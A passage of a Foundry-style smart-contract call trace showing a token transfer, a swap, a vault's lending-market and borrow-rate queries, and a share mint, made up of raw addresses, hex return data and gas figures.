    │   │   │   │   │   │   ├─ [7297] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::transferFrom(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, 1000000000000000000000 [1e21])
    │   │   │   │   │   │   │   ├─ [6581] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::transferFrom(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, 1000000000000000000000 [1e21]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, to: 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, value: 1000000000000000000000 [1e21])
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [staticcall]
    │   │   │   │   │   │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 2533847496599926410526 [2.533e21]
    │   │   │   │   │   │   └─ ← [Return] 2533847496599926410526 [2.533e21]
    │   │   │   │   │   ├─ emit Swap(param0: 0x4e1d81A3E627b9294532e990109e4c21d217376C, param1: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, param2: -1855634437106 [-1.855e12], param3: 1000000000000000000000 [1e21], param4: 3050506753323434216152770313295905 [3.05e33], param5: 31803193720492242 [3.18e16], param6: 211180 [2.111e5])
    │   │   │   │   │   └─ ← [Return] 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffe4ff3918c0e00000000000000000000000000000000000000000000003635c9adc5dea00000
    │   │   │   │   └─ ← [Return] 1855634437106 [1.855e12]
    │   │   │   ├─ [3079] 0xCE2b8e464Fc7b5E58710C24b7e5EBFB6027f29D7::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   │   │   │   └─ ← [Return] 30363683513771595986006474 [3.036e25]
    │   │   │   ├─ [443712] 0xCE2b8e464Fc7b5E58710C24b7e5EBFB6027f29D7::convertToAssets(30363683513771595986006474 [3.036e25]) [staticcall]
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x5ccaa3e4958c08051e26d60f7fd2454516bd981375c2ede584826490dc2e7280) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0xd0c4173c1dd1f30c5c927c8b9f98294294be1292ebd41e1eafbbcba1028343db]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000563132900ccc0
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x5ccaa3e4958c08051e26d60f7fd2454516bd981375c2ede584826490dc2e7280) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000608f705d7800000000000000000000000000000000000000000000000005c164b44e384e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000069280c250000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xcd2dc555dced7422a3144a4126286675449019366f83e9717be7c2deb3daae3e) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000000913da6da4b42f538b445599b46bb4622342cf52000000000000000000000000b60f728bdce5e3921c0e42c1a6f07a1313d0040e0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x4b807718ccf367383077da1df57347d73f5163a5f2eea67b5418bf3d6c4171c7]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000007a8a8f5c473200f4
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xcd2dc555dced7422a3144a4126286675449019366f83e9717be7c2deb3daae3e) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000020b3ae018518000000000000000000000000000000000000000000000001ef6d7293d22ee54f0000000000000000000000000000000000000000000000000000158f4b615d64000000000000000000000000000000000000000000000001464051873271a546000000000000000000000000000000000000000000000000000000006927febf0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x0913DA6Da4b42f538B445599b46Bb4622342Cf52, 0xB60F728BdcE5e3921C0E42c1a6F07A1313D0040e, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (35956090570008 [3.595e13], 35699315800447837519 [3.569e19], 23705189178724 [2.37e13], 23508879695982732614 [2.35e19], 1764228799 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000029a8afc2
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x2fb14719030835b8e0a39a1461b384ad6a9c8392550197a7c857cf9fcbd6c534) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000ee7d8bcfb72bc1880d0cf19822eb0a2e6577ab62000000000000000000000000d423d353f890ad0d18532ffaf5c47b0cb943bf470000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x6134b6f30fc70b7fbe09c812e3b24a4f48945ade04e59f00f06a48a72dfc3d2b]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000003076863c5e325992
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x2fb14719030835b8e0a39a1461b384ad6a9c8392550197a7c857cf9fcbd6c534) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000a25e2d2b25b00000000000000000000000000000000000000000000000099c0f082365ae7c7000000000000000000000000000000000000000000000000000007c4ce9e9b9f0000000000000000000000000000000000000000000000007592d837e65822d8000000000000000000000000000000000000000000000000000000006927ea4c0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xD423D353f890aD0D18532fFaf5c47B0Cb943bf47, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (11157835526747 [1.115e13], 11079119525379762119 [1.107e19], 8541861485471 [8.541e12], 8472071583636660952 [8.472e18], 1764223564 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000002716f446
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xa0cd6b9d1fcc6baded4f7f8f93697dbe7f24f6e1fc22602a625c7a80b8e8e6ef) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000ecac9c5f704e954931349da37f60e39f515c11c1000000000000000000000000cc139318686969b9d30dd62aa206725b269da40d0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0xb5b837c74fa6806002fd3a23501b416c4fc7547bf974b0637785fa225b3fbff8]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xa0cd6b9d1fcc6baded4f7f8f93697dbe7f24f6e1fc22602a625c7a80b8e8e6ef) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000001277b17479200000000000000000000000000000000000000000000000011648dcd67ed96d7000000000000000000000000000000000000000000000000000000b4cb5f32490000000000000000000000000000000000000000000000000a9f5ac178edcf8f00000000000000000000000000000000000000000000000000000000692803500000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xecAc9C5F704e954931349Da37F60E39f515c11c1, 0xcC139318686969b9D30Dd62aA206725B269DA40d, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (1269080475538 [1.269e12], 1253282509667276503 [1.253e18], 776506126921 [7.765e11], 765430248680312719 [7.654e17], 1764229968 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000245e1dc3
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x0e9d558490ed0cd523681a8c51d171fd5568b04311d0906fec47d668fb55f5d9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000b0f70c0bd6fd87dbeb7c10dc692a2a610681707200000000000000000000000083f4197076614efe8e4c37bb9efbfead08d4719f0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x115a2c52309574a8b3a9fb502ff331a302403942beaee5db1149ca0fd276f620]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x0e9d558490ed0cd523681a8c51d171fd5568b04311d0906fec47d668fb55f5d9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000055f599b3f7000000000000000000000000000000000000000000000000050ea42e8860930c000000000000000000000000000000000000000000000000000000112b62c49b00000000000000000000000000000000000000000000000001025abedbf6c81d000000000000000000000000000000000000000000000000000000006926dd6e0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xB0F70C0bD6FD87dbEb7C10dC692a2a6106817072, 0x83F4197076614efe8e4c37BB9EFBfeaD08d4719f, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (369192711159 [3.691e11], 364409139627070220 [3.644e17], 73742337179 [7.374e10], 72720319772018717 [7.272e16], 1764154734 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000c98017
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xcdaf57d98c2f75bffb8f0d3f7aa79bbacda4a479c47e316aab14af1ca6d85ffc) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000009a6bd7b6fd5c4f87eb66356441502fc7dcdd185b000000000000000000000000d978ce03d8bb0eb3f09cb2a469dbbc25db42f3ae0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x113b019b1a1ae6ebb77894d50fd7fd4bd87f532c42648cd3ec74849ce6a17ce6]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000476d0281656d22c4
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xcdaf57d98c2f75bffb8f0d3f7aa79bbacda4a479c47e316aab14af1ca6d85ffc) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000070de2cbb0d60000000000000000000000000000000000000000000000006a1a5366185e7bbd00000000000000000000000000000000000000000000000000000616422ea6460000000000000000000000000000000000000000000000005b6064184c60d965000000000000000000000000000000000000000000000000000000006927c2c70000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x9A6bd7B6Fd5C4F87eb66356441502fc7dCdd185B, 0xD978CE03d8BB0eb3f09cB2a469DbbC25DB42F3Ae, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (7756220969174 [7.756e12], 7645515015375453117 [7.645e18], 6692669400646 [6.692e12], 6584372710739073381 [6.584e18], 1764213447 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000004e17518a
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x08f67ef41398456dbc5ff72d43c8b6f7917abfd01498a9fc6c89dabe6eb78b8c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000e007ca01894c863d7898045ed5a3b4abf0b18f37000000000000000000000000aa9853c78b92606b21ce57da7f04f301f031aba40000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x29e239c68a4f6dc6a3d25deacb5cfad26fceeee1fcd52545613bfd97aaf9896c]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000786514945491fe7c
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x08f67ef41398456dbc5ff72d43c8b6f7917abfd01498a9fc6c89dabe6eb78b8c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000acf2cb52521000000000000000000000000000000000000000000000000a3584bf474dc21750000000000000000000000000000000000000000000000000000093583778dbc0000000000000000000000000000000000000000000000008afb4ba01d3ef1b500000000000000000000000000000000000000000000000000000000692804690000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xE007CA01894c863d7898045ed5A3B4Abf0b18f37, 0xaa9853c78B92606b21cE57Da7F04F301f031Aba4, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (11884924577057 [1.188e13], 11770241139437478261 [1.177e19], 10125443567036 [1.012e13], 10014681347445944757 [1.001e19], 1764230249 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000050b9111e
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x76e311d4b0e2e6ae88ad9bab18063452a6d39837d7104c430ff62457b91cb2cb) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000009893989433e7a383cb313953e4c2365107dc19a70000000000000000000000009b32a1859fe79fe76f8c1b771664b28852c3718c0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x345b7096db6c387717f255f209ff2e8d7c4abcac7effae88e09e9cdc4024e5c1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x76e311d4b0e2e6ae88ad9bab18063452a6d39837d7104c430ff62457b91cb2cb) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000026ffb95218000000000000000000000000000000000000000000000000025312e62207118c0000000000000000000000000000000000000000000000000000000343ddf9850000000000000000000000000000000000000000000000000031d21e3deedf6d000000000000000000000000000000000000000000000000000000006926a5ab0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x9893989433e7a383Cb313953e4c2365107dc19a7, 0x9b32a1859FE79fE76F8C1B771664b28852c3718c, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (167499092504 [1.674e11], 167498390765506956 [1.674e17], 14023522693 [1.402e10], 14023301188738925 [1.402e16], 1764140459 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000009ab8a4
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x3a22063bd258f3f75e3135cac4ec53435dfa5b47b3d5173bb8fd5278e6c1b305) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000aa0362ecc584b985056e47812931270b99c91f9d00000000000000000000000029bdd31828260de15f6431410da3a24c1851d80e0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x4ac2d4b58754e8a4005e379d3df2c3373511409c90c276cc5ab0ec77dc392044]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000c89c02a2f58fa5b
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x3a22063bd258f3f75e3135cac4ec53435dfa5b47b3d5173bb8fd5278e6c1b305) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000d3cc875d650000000000000000000000000000000000000000000000000c89c1307e0c2564000000000000000000000000000000000000000000000000000000be9e79d9980000000000000000000000000000000000000000000000000b45e4412f7bd5d7000000000000000000000000000000000000000000000000000000006925fb000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5374] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xAa0362eCC584B985056E47812931270b99C91f9d, 0x29Bdd31828260DE15f6431410da3a24c1851d80e, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (909669522789 [9.096e11], 903465614281811300 [9.034e17], 818702571928 [8.187e11], 812306276430894551 [8.123e17], 1764096768 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003cc9c1c3
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xcfac40b9f06194a33d9526f73642f6849b908c2b6d8669ad9d2d4a3e7dcb017a) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd3600000000000000000000000093fec6639717b6215a48e5a72a162c50dcc40d680000000000000000000000002c6204aedcc71a4eb373820248f513a4e91be62f0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x47fb97f2ba64cf8699ba25ede739a84eaa55353414173aa6ee718cee7797a3b2]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000002d53913026d5977e
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xcfac40b9f06194a33d9526f73642f6849b908c2b6d8669ad9d2d4a3e7dcb017a) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000002fc84b19a2b0000000000000000000000000000000000000000000000002d5391a491281f7e000000000000000000000000000000000000000000000000000002b0110d268c00000000000000000000000000000000000000000000000028c444e861476525000000000000000000000000000000000000000000000000000000006927f8c50000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5374] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x93Fec6639717b6215A48E5a72a162C50DCC40d68, 0x2c6204aEDCC71A4EB373820248F513A4e91be62F, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (3283581245995 [3.283e12], 3266114290769731454 [3.266e18], 2955223574156 [2.955e12], 2937548621807576357 [2.937e18], 1764227269 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000004685cedc
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xd3b3c992070b5a6271b11acde46cdad575e4187e499782e084d73e523153f1ed) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000007fb4d0f51544f24f385a421db6e7d4fc71ad8e5c0000000000000000000000001c5f3862c913e015ed0a2a9d71e13be74101f47d0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x8f8a620965b5e63c41a83de86019fb16d5a0ff0ebc3ec00e35c582be79d5b515]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xd3b3c992070b5a6271b11acde46cdad575e4187e499782e084d73e523153f1ed) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000022e08b5574000000000000000000000000000000000000000000000000016cbe8086f824b300000000000000000000000000000000000000000000000000000000dcaa04760000000000000000000000000000000000000000000000000008b6178c8348fa00000000000000000000000000000000000000000000000000000000692760ee0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x7Fb4D0f51544F24F385a421Db6e7D4fC71Ad8e5C, 0x1c5f3862c913E015eD0a2A9d71E13BE74101F47d, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (149796115828 [1.497e11], 102666350752179379 [1.026e17], 3702129782 [3.702e9], 2452012071602426 [2.452e15], 1764188398 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000018a210cb
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xe4c5c5b802accd32c67253005b6e9df4f5c57c2426a9322c5e12f84981adf8c9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000005bff88ca1442c2496f7e475e9e7786383bc070c000000000000000000000000091a3030277b20c084aa83d4f8c8a714fd4e054ab0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000cb2bba6f17b8000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x91666dfc9cfeb8df5519318bc5b3d4d398a890ba98863cda55dd0c556a182672]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xe4c5c5b802accd32c67253005b6e9df4f5c57c2426a9322c5e12f84981adf8c9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000007a32e000000000000000000000000000000000000000000000000000000746a528800000000000000000000000000000000000000000000000000000000000006dfe400000000000000000000000000000000000000000000000000000068c617140000000000000000000000000000000000000000000000000000000000690a5adb0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5374] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x5Bff88cA1442c2496f7E475E9e7786383Bc070c0, 0x91A3030277B20C084Aa83d4f8C8a714Fd4E054AB, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 915000000000000000 [9.15e17]), (500526 [5.005e5], 500000000000 [5e11], 450532 [4.505e5], 450000000000 [4.5e11], 1762286299 [1.762e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000466b698a
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000001bce6978063a
    │   │   │   ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   │   │   │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1855634437106 [1.855e12]
    │   │   │   │   └─ ← [Return] 1855634437106 [1.855e12]
    │   │   │   ├─ [908] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::totalAssets() [staticcall]
    │   │   │   │   ├─ [507] 0xD377919FA87120584B21279a491F82D5265A139c::totalAssets() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 30567291587044 [3.056e13]
    │   │   │   │   └─ ← [Return] 30567291587044 [3.056e13]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000001d7e75e67a2c
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, value: 1842027113422 [1.842e12])
    │   │   ├─  emit topic 0: 0xecdd072e4d5bd913a75a37f02daedcea7e2dc0281f9942c0063cfd1cfe5c4c4f
    │   │   │           data: 0x000000000000000000000000000000000000000000000000000001b17557f048000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 1861689536584 [1.861e12], 0
    │   └─ ← [Return] 1861689536584 [1.861e12], 0
